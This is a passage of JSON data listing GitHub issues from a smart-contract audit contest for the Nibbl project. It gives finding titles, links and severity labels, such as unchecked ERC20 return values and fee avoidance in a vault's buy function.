aren't checked in some places", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/25", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "ERC20 return values aren't checked in some places"}, {"title": "Lack of sanity check on _initialTokenSupply and _initialTokenPrice can lead to a seller losing his NFT", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/24", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "Lack of sanity check on _initialTokenSupply and _initialTokenPrice can lead to a seller losing his NFT"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/16", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/15", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "NibblVault: In the buy function, users can avoid paying fees", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/14", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "NibblVault: In the buy function, users can avoid paying fees"}]